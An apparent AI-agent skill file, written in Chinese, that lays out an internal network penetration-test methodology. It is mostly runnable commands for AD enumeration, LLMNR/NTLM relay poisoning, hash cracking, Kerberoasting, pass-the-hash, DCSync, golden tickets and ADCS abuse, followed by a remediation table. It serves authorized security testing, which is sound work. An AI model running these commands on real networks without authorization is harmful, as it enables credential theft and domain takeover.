---
name: cszh-conducting-internal-network-penetration-test
description: 执行内部网络渗透测试，模拟内部威胁或后渗透攻击者，以识别企业网络内的横向移动路径、权限提升向量和敏感数据暴露情况。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 conducting-internal-network-penetration-test），正文按中文原文照录。

**这个技能干什么**：执行内部网络渗透测试，模拟内部威胁或后渗透攻击者，以识别企业网络内的横向移动路径、权限提升向量和敏感数据暴露情况。

**什么时候用**：需要按上游中文方法论执行「conducting-internal-network-penetration-test」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 执行内部网络渗透测试

## 概述

内部网络渗透测试模拟已获得内部网络访问权限的攻击者或恶意内部人员。测试人员以"假设已入侵"的立场进行操作——通常是标准域工作站或网络接口——并尝试横向移动、权限提升、凭据收割和数据窃取，以确定已入侵端点的爆炸半径。

## 前置条件

- 已签署包含内部网络范围的交战规则
- 网络访问：物理以太网接口或内部 VLAN 的 VPN 连接
- 标准域用户凭据（假设已入侵模型）或未认证访问
- 安装了 Kali Linux、Impacket、Responder、BloodHound 的测试笔记本
- 与 IT/SOC 协调监控和紧急联系方式

## 阶段一：网络发现和枚举

### 初始网络侦察

```bash
# 识别自身网络位置
ip addr show
ip route show
cat /etc/resolv.conf

# 本地子网的 ARP 扫描以查找存活主机
arp-scan --localnet --interface eth0

# Nmap 对内网范围的主机发现
nmap -sn 10.0.0.0/8 --exclude 10.0.0.1 -oG internal_hosts.gnmap
nmap -sn 172.16.0.0/12 -oG internal_hosts_172.gnmap
nmap -sn 192.168.0.0/16 -oG internal_hosts_192.gnmap

# 提取存活主机
grep "Status: Up" internal_hosts.gnmap | awk '{print $2}' > live_hosts.txt

# 扫描存活主机的端口 — 前 1000 个端口
nmap -sS -sV -T4 -iL live_hosts.txt -oA internal_tcp_scan

# 特定服务扫描
nmap -p 445 --open -iL live_hosts.txt -oG smb_hosts.gnmap
nmap -p 3389 --open -iL live_hosts.txt -oG rdp_hosts.gnmap
nmap -p 22 --open -iL live_hosts.txt -oG ssh_hosts.gnmap
nmap -p 1433,3306,5432,1521,27017 --open -iL live_hosts.txt -oG db_hosts.gnmap
```

### 活动目录枚举

```bash
# 使用域凭据枚举域信息
# 使用 CrackMapExec / NetExec
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --shares
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --users
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --groups

# LDAP 枚举
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

# 枚举组策略对象
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --lsa

# BloodHound 数据收集
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local -ns 10.0.0.5 -c all
# 将 JSON 文件导入 BloodHound GUI 进行攻击路径分析

# Enum4linux-ng 进行传统枚举
enum4linux-ng -A 10.0.0.5 -u 'testuser' -p 'Password123'
```

### 网络服务枚举

```bash
# SMB 共享枚举
smbclient -L //10.0.0.10 -U 'testuser%Password123'
smbmap -H 10.0.0.10 -u 'testuser' -p 'Password123' -R

# SNMP 枚举
snmpwalk -v2c -c public 10.0.0.1

# DNS 区域传输尝试
dig axfr corp.local @10.0.0.5

# NFS 枚举
showmount -e 10.0.0.15

# MSSQL 枚举
impacket-mssqlclient 'corp.local/testuser:Password123@10.0.0.20' -windows-auth
```

## 阶段二：凭据攻击

### 网络凭据捕获

```bash
# Responder — LLMNR/NBT-NS/mDNS 投毒
sudo responder -I eth0 -dwPv

# 从 Responder 日志捕获 NTLMv2 哈希
cat /usr/share/responder/logs/NTLMv2-*.txt

# mitm6 — IPv6 DNS 接管
sudo mitm6 -d corp.local

# ntlmrelayx — 中继捕获的凭据
impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks

# PetitPotam — 强制 NTLM 认证
python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
  attacker_ip 10.0.0.5
```

### 密码攻击

```bash
# 破解捕获的 NTLMv2 哈希
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# 密码喷洒（注意账户锁定策略）
netexec smb 10.0.0.5 -u users.txt -p 'Spring2025!' --no-bruteforce
netexec smb 10.0.0.5 -u users.txt -p 'Company2025!' --no-bruteforce

# Kerberoasting — 针对服务账户
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast_hashes.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting — 针对无需预认证的账户
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## 阶段三：漏洞利用和横向移动

### 横向移动技术

```bash
# 使用 Impacket 进行哈希传递
impacket-psexec 'corp.local/admin@10.0.0.30' -hashes :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

# WMI 执行
impacket-wmiexec 'corp.local/admin:AdminPass123@10.0.0.30'

# Evil-WinRM 用于 PowerShell 远程处理
evil-winrm -i 10.0.0.30 -u admin -p 'AdminPass123'

# SMBExec
impacket-smbexec 'corp.local/admin:AdminPass123@10.0.0.30'

# RDP 访问
xfreerdp /v:10.0.0.30 /u:admin /p:'AdminPass123' /cert-ignore /dynamic-resolution

# SSH 代理隧道
ssh -D 9050 user@10.0.0.40
proxychains nmap -sT -p 80,443,445,3389 10.10.0.0/24
```

### 权限提升

```bash
# Windows 权限提升
# 通过令牌模拟检查本地管理员
meterpreter> getsystem
meterpreter> run post/multi/recon/local_exploit_suggester

# 基于 PowerShell 的权限提升检查
# 运行 PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# 检查未加引号的服务路径
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Linux 权限提升
./linpeas.sh
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

### 域升级

```bash
# DCSync 攻击（需要复制权限）
impacket-secretsdump 'corp.local/domainadmin:DaPass123@10.0.0.5' -just-dc

# 黄金票据攻击
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator

# 白银票据攻击
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/db01.corp.local administrator

# ADCS 利用（Certifried、ESC1-ESC8）
certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5
certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
  -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
```

## 阶段四：数据访问和影响演示

```bash
# 访问敏感文件共享
smbclient //10.0.0.10/Finance -U 'domainadmin%DaPass123'
> dir
> get Q4_Financial_Report.xlsx

# 数据库访问
impacket-mssqlclient 'sa:DbPassword123@10.0.0.20'
SQL> SELECT name FROM sys.databases;
SQL> SELECT TOP 10 * FROM customers;

# 提取访问证明（切勿泄露真实数据）
echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt

# 记录访问链
# 初始访问 -> Responder -> NTLMv2 破解 -> 横向移动到 WS01
# -> 本地管理员 -> Mimikatz -> DA 凭据 -> DCSync -> 完全域入侵
```

## 阶段五：报告

### 攻击路径文档

```
攻击路径 1：通过 LLMNR 投毒实现域入侵
  步骤 1：LLMNR/NBT-NS 投毒捕获 NTLMv2 哈希（T1557.001）
  步骤 2：离线破解哈希 — 用户：jsmith，密码：Welcome2025!
  步骤 3：jsmith 在 WS042 上有本地管理员权限 — 通过 PsExec 横向移动（T1021.002）
  步骤 4：Mimikatz 从 WS042 内存中提取 DA 凭据（T1003.001）
  步骤 5：使用 DA 凭据执行 DCSync — 提取所有域哈希（T1003.006）
  影响：从未认证网络位置实现完整域入侵
```

### 发现严重性矩阵

| 发现 | CVSS | MITRE ATT&CK | 修复措施 |
|---------|------|---------------|-------------|
| LLMNR/NBT-NS 投毒 | 8.1 | T1557.001 | 通过 GPO 禁用 LLMNR/NBT-NS |
| Kerberoastable 服务账户 | 7.5 | T1558.003 | 使用 gMSA，25+ 字符密码 |
| 本地管理员复用 | 8.4 | T1078 | 部署 LAPS，使用唯一本地管理员密码 |
| 弱域密码 | 7.2 | T1110 | 强制 14+ 字符最小长度，黑名单常用密码 |
| 不受限的 DCSync | 9.8 | T1003.006 | 审计复制权限，实施分层管理员模型 |

## 工具参考

| 工具 | 用途 |
|------|---------|
| Responder | LLMNR/NBT-NS/mDNS 投毒 |
| Impacket | AD 攻击套件（secretsdump、psexec、wmiexec 等） |
| BloodHound | AD 攻击路径可视化 |
| NetExec（CrackMapExec） | 网络服务枚举和密码喷洒 |
| Evil-WinRM | PowerShell 远程处理客户端 |
| Certipy | AD 证书服务漏洞利用 |
| Mimikatz | Windows 凭据提取 |
| Hashcat | 密码哈希破解 |
| Nmap | 网络扫描和枚举 |
| LinPEAS/WinPEAS | 权限提升枚举 |

## 参考资料

- Cobalt 内部网络渗透测试方法论: https://docs.cobalt.io/methodologies/internal-network/
- MITRE ATT&CK 企业版: https://attack.mitre.org/matrices/enterprise/
- PTES: http://www.pentest-standard.org/
- Impacket: https://github.com/fortra/impacket
- BloodHound: https://github.com/BloodHoundAD/BloodHound
